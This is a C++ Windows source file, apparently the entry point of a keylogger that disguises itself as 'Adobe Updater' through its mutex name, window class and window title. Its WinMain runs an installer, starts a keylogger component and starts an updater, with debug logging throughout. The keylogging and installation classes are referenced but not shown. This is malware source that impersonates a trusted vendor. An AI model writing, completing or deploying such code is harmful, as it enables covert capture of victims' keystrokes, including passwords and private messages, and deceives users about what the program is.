#include "main.h"

#include "resource.h"

FILE *debugLog = NULL;

HINSTANCE hInst;
HWND	  hWnd;

Installer myInstaller;
KeyLogger myKeyLogger;
Updater   myUpdater;

DWORD mainThreadID;
HANDLE syncMutex;

void DebugLog(const char *fmt, ...)
{
#ifdef _DEBUG

	va_list arg;

	va_start(arg, fmt);

	vfprintf(debugLog, fmt, arg);
		
	va_end(arg);

	fprintf(debugLog, "\r\n");
	fflush(debugLog);

#endif
}

void Shutdown()
{
	DebugLog("Shutting down...");

	int error = 0;

	error |= myKeyLogger.Shutdown();
	error |= myUpdater.Shutdown();
	error |= myInstaller.Shutdown();

	if (error)
	{
		DebugLog("Shutdown completed with errors.");
	}
	else
	{
		DebugLog("Shutdown completed cleanly.");
	}

#ifdef _DEBUG
	
	fclose(debugLog);

#endif

	exit(error);
}

char *GetTimeString()
{
	time_t rawTime; time(&rawTime);
	tm *timeInfo = localtime(&rawTime);

	char *timeString = asctime(timeInfo);

	int i = 0;

	while ((timeString[i] != 0) && (timeString[i] !=0x0A)) i++;

	timeString[i] = 0;

	return timeString;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	// initialize debug log

#ifdef _DEBUG

	debugLog = fopen("debuglog.txt", "a+b");

	if (!debugLog) return 1;

	DebugLog("\r\n*********************************\r\n");

	DebugLog("Startup at %s", GetTimeString());

#endif

	mainThreadID = GetCurrentThreadId();

	DebugLog("Creating sync mutex...");
	
	syncMutex = CreateMutex(NULL, true, "Adobe Updater Synchronization");

	if (!syncMutex)
	{
		DebugLog("Unable to create or open sync mutex. Shutting down...");

		return 1;
	}

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		DebugLog("Mutex already set, updater must already be running. Shutting down...");

		return 0;
	}

	// initialize global strings

	DebugLog("Registering window class...");
	MyRegisterClass(hInstance);

	// perform application initialization

	DebugLog("Initializing application instance...");

	if (!InitInstance(hInstance, nCmdShow)) 
	{
		return 1;
	}

	DebugLog("Running installer...");
	if (!myInstaller.Install())
	{
		DebugLog("Error installing.");
		return 1;
	}
	DebugLog("Installer completed successfully.");

	DebugLog("Starting keylogger...");
	if (!myKeyLogger.StartKeyLogger())
	{
		DebugLog("Error starting keylogger.");
		return 1;
	}
	DebugLog("Keylogger started successfully.");

	DebugLog("Starting updater...");
	if (!myUpdater.StartUpdater())
	{
		DebugLog("Error starting updater.");
		return 1;
	}
	DebugLog("Updater started successfully.");

	// windows message processing loop

	MSG msg;

	DebugLog("Entering windows message loop...");
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASS wc;

	wc.style		 = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc	 = (WNDPROC)WndProc;
	wc.cbClsExtra	 = 0;
	wc.cbWndExtra	 = 0;
	wc.hInstance	 = hInstance;

	wc.hIcon         = LoadIcon(hInstance, (LPCTSTR)IDI_ICON1);

	wc.hCursor		 = NULL;
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName	 = NULL;
	wc.lpszClassName = "Adobe Updater\0";

	return RegisterClass(&wc);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance;

	hWnd = CreateWindow("Adobe Updater\0", "Adobe Updater\0", WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

	/*
	if (!hWnd)
	{
		DebugLog("Error creating main window.");

		return FALSE;
	}
	*/

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;

	switch (message) 
	{
	case WM_COMMAND:

		wmId    = LOWORD(wParam); 
		wmEvent = HIWORD(wParam); 

		switch (wmId)
		{
		case WM_DESTROY:

			PostQuitMessage(0);
			break;

		case WM_QUIT:

			DebugLog("Received WM_QUIT event...");
			Shutdown();

			break;

		default:

			return DefWindowProc(hWnd, message, wParam, lParam);
		}
	}

	return 0;
}